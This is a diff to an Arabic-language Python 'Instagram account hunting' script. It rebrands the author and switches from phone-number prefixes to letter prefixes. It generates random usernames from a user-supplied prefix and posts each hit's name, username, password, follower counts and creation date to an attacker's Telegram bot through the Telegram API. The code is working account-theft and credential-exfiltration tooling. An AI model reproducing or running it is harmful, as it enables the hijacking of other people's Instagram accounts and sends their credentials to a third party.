@@ -63,7 +63,7 @@ else:
 
 
 
-    a(f"         {Y}------صيد حسابات انستقرام مقدمه من اخوكم طارق الدليمي---------"  )
+    a(f"         {Y}------صيد حسابات انستقرام مقدمه من اخوكم قيس التكريتي ---------"  )
     sleep(1)
     print('\n\n')
     a(G + ' \n\nالتوكن ')
@@ -103,7 +103,7 @@ else:
         dat = ree['data']
         t = time.localtime()
         current_time = time.strftime('%H:%M:%S', t)
-        joo3 = f"\n⭐✅تعال حبيصي جبتلك حساب  ✅⭐\n\n✔️⭐   ⭐✔️\n ︎.<•>︎ ––––––––––––––––︎ <•>. \n .♻. Name ➡  : {name}\n .🔱. Use®Name☣ : {userQ}\n .🔆. BaSsWord↪  : {password}\n .♾. 𝕱ollowes✴ : {followes}\n .💠. 𝕱𝖔𝖑𝖑𝖔𝖜𝖎𝖓𝖌 : {following}\n .➡. 𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕺𝖆𝖙𝖊 : {dat}\n .⚠. TIⓂE : {current_time}\n .⛔. 𝙩𝙝𝙞𝙨 𝙄𝙨 𝙏𝙝𝙚 𝙃𝙪𝙣𝙩 𝙉𝙪𝙢𝙗𝙚𝙧 [{zz}] ✅🤤\n ︎.<•>︎ ––––––––––––––––︎ <•>.\n.🔰. 𝐂𝐡 :@Tariq_black ♦\n"
+        joo3 = f"\n⭐✅تعال ضلعي جبتلك حساب  ✅⭐\n\n✔️⭐   ⭐✔️\n ︎.<•>︎ ––––––––––––––––︎ <•>. \n .♻. Name ➡  : {name}\n .🔱. Use®Name☣ : {userQ}\n .🔆. BaSsWord↪  : {password}\n .♾. 𝕱ollowes✴ : {followes}\n .💠. 𝕱𝖔𝖑𝖑𝖔𝖜𝖎𝖓𝖌 : {following}\n .➡. 𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕺𝖆𝖙𝖊 : {dat}\n .⚠. TIⓂE : {current_time}\n .⛔. 𝙩𝙝𝙞𝙨 𝙄𝙨 𝙏𝙝𝙚 𝙃𝙪𝙣𝙩 𝙉𝙪𝙢𝙗𝙚𝙧 [{zz}] ✅🤤\n ︎.<•>︎ ––––––––––––––––︎ <•>.\n.🔰. 𝐂𝐡 :@Tariq_black ♦\n"
         tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
         i = requests.post(tlg)
         print(G + joo3)
@@ -113,14 +113,14 @@ else:
     headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
     
     
-    a(F + 'iraq : 0770 or 0771 or 0772 or 0780 or 0781 or 0782 or 0783 or 0750 or 0751 or 0752                                                     ')
+    a(F + 'iraq : g or e or r or n or m or s or d or f or f or d                                                     ')
   
     phonenumber = input(X +
     
-                                                                                                                  ' قم بادخال الرقم الذي تريد الصيد عليه :  >> ' + C)
+                                                                                                                  ' قم بادخال اليوزر الذي تريد الصيد عليه :  >> ' + C)
     print(G + 'The Tool Has Been Started Successfully ✔️ ')
     sleep(0.1)
-    user = '1234567890'
+    user = 'ajd'
     while True:
         us = str(''.join((random.choice(user) for i in range(7))))
         username = phonenumber + us
